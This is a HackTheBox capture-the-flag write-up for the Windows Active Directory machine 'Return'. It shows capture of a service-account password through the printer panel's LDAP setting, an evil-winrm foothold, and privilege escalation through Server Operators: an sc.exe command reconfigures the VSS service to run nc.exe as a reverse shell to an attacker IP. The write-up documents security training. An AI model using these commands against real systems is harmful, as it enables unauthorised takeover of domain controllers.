---
title: "Return"
date: 2024-05-11
categories: HTB
tags: ["htb walkthrough", "ctf", "cybersecurity", "hackthebox", "htb writeup", "return", "penetration testing", "writeup", "htb"]
---

# Return

# Return
OS: Windows(AD)
Difficulty: Easy
Date: 2025-03-31
# Credentials
```text
svc-printer : 1edFg43012!!
```

# Summary


# Credentials
| username    | password     | hash | source |
| ----------- | ------------ | ---- | ------ |
| svc-printer | 1edFg43012!! |      |        |
|             |              |      |        |
 
# Todo 
- [ ] 

# Enumeration
## Nmap
```sh
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: HTB Printer Admin Panel
|_http-server-header: Microsoft-IIS/10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-03-31 05:45:07Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: PRINTER; OS: Windows; CPE: cpe:/o:microsoft:windows
```

- [ ] 80
	- [ ] directory fuzzing
	- [x] web
- [x] SMB
- [ ] LDAP
- [ ] 464
- [ ] 593
- [ ] 636
- [ ] 3269
- [ ] 5985

## 80
![[/assets/images/return1.png]]

![[/assets/images/return2.png]]

Add my IP address to Server Address

```sh
sudo responder -I tun0
```

![[/assets/images/return3.png]]

## SMB
![[/assets/images/return4.png]]

- [x] add `return.local` to `/etc/hosts`
- [ ] spider_plus

```sh
smbclient.py '[domain]/[user]:[pass]@[ip/host]' -k -no-pass - Kerberos auth

smbclient 'return.local/svc-printer:1edFg43012!!' -k -no-pass -Kerberos auth
```
### Share Enum
#### ADMIN$
![[/assets/images/return5.png]]
# Foothold
Evil-winrm as svc-printer
![[/assets/images/return6.png]]

# Privilege Escalation
runphp.cmd
![[/assets/images/return7.png]]
![[/assets/images/return8.png]]

Server Operators 

There may be others of interest, but Server Operators jumps out immediately. [This group](https://ss64.com/nt/syntax-security_groups.html#:~:text=A%20built%2Din%20group%20that,and%20shut%20down%20the%20computer.) can do a lot of things:

- A built-in group that exists only on domain controllers. 
- By default, the group has no members. 
- Server Operators can log on to a server interactively; create and delete network shares; start and stop services; back up and restore files; format the hard disk of the computer; and shut down the computer. 
- Default [User Rights](https://ss64.com/nt/ntrights.html): Allow log on locally: SeInteractiveLogonRight Back up files and directories: SeBackupPrivilege Change the system time: SeSystemTimePrivilege Change the time zone: SeTimeZonePrivilege Force shutdown from a remote system: SeRemoteShutdownPrivilege Restore files and directories SeRestorePrivilege Shut down the system: SeShutdownPrivilege

```sh
# install windows binaries
sudo apt-install windows-binaries
# copy nc to pwd
sudo cp /usr/share/windows-resources/binaries/nc.exe .
```

Upload nc.exe to the target device

![[/assets/images/return9.png]]

```sh
*Evil-WinRM* PS C:\programdata> sc.exe config VSS binpath="C:\programdata\nc.exe -e cmd 10.10.14.7 443"
```

![[/assets/images/return10.png]]

![[/assets/images/return11.png]]
